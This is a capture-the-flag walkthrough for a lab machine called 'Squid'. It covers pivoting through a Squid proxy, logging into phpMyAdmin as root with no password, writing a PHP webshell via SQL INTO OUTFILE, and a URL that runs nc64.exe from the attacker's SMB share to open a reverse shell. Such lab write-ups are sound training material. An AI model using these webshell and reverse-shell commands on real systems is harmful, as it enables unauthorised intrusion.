# Squid

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.233.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 15:29 +08
Nmap scan report for 192.168.233.189
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
3128/tcp open  squid-http
```

Only one port is open.

### Squid Proxy -> FoxyProxy

The port was a Squid Proxy instance. When visited in a browser, this is all we see:

<figure><img src="../../../.gitbook/assets/image (1720).png" alt=""><figcaption></figcaption></figure>

Since this is a proxy service, it might be the gateway that we need to access the services running on the machine itself. To scan the machine, we can include this line in our `/etc/proxychains4.conf` file:

```
socks5 192.168.233.189 3128
```

Afterwards, we can use `proxychains` to scan the machine again to find more ports that are open,  but this takes far too long. Instead, we can use FoxyProxy to attempt to view some interesting ports. I tried with a few ports like 80, 443 and 8080 for websites, and found a service on port 8080.

<figure><img src="../../../.gitbook/assets/image (1658).png" alt=""><figcaption></figcaption></figure>

### Default Creds -> SQL RCE

There's a PHPMyAdmin instance present on the page, and we can login using `root` as the username with no password.

<figure><img src="../../../.gitbook/assets/image (2202).png" alt=""><figcaption></figcaption></figure>

Since this is already the administrative interface, we can get a shell by creating a database and then executing some SQL commands in it via the web SQL interpreter.&#x20;

<figure><img src="../../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can select this database and head to the QUERY tab:

<figure><img src="../../../.gitbook/assets/image (2609).png" alt=""><figcaption></figcaption></figure>

We can test it with any query and see that it is indeed processing SQL queries:

<figure><img src="../../../.gitbook/assets/image (3448).png" alt=""><figcaption></figcaption></figure>

Since we can submit queries, we can also write files into the file system of the machine. I wanted to write a basic PHP webshell, but this means we need to know the webroot file. Very conveniently, there's a `phpinfo` page on the main Wampserver page.&#x20;

There, we can find the `DOCUMENT_ROOT`:

<figure><img src="../../../.gitbook/assets/image (3249).png" alt=""><figcaption></figcaption></figure>

We can then use this query to write a webshell onto the machine:

```sql
SELECT '<?php system($_GET["cmd"]); ?>' into outfile "C:\\wamp\\www\\backdoor.php"
```

<figure><img src="../../../.gitbook/assets/image (1307).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can test our RCE:

<figure><img src="../../../.gitbook/assets/image (3951).png" alt=""><figcaption></figcaption></figure>

Great! No all we need to do is get a reverse shell as the user. By setting up a SMB server on our machine with `nc64.exe` within the directory, we can send this to get a shell:

```
http://192.168.233.189:8080/backdoor.php?cmd=\\192.168.45.161\share\nc64.exe+-e+cmd.exe+192.168.45.161+4444
```

<figure><img src="../../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>

There is no privilege escalation, because we have successfully gotten a SYSTEM shell.&#x20;

{% hint style="info" %}
This machine was changed since I last did it in 2022. My older writeups show that the machine was running as LOCAL SYSTEM instead of the SYSTEM user.

The old box would give us intial access with the LOCAL SYSTEM user without any privileges, and we had to use either schtasks or FullPowers.exe to give us a shell with the full privileges of a LOCAL SYSTEM user that includes SeImpersonatePrivilege, which we can then use PrintSpoofer.exe or JuicyPotato.exe to get a SYSTEM shell.
{% endhint %}
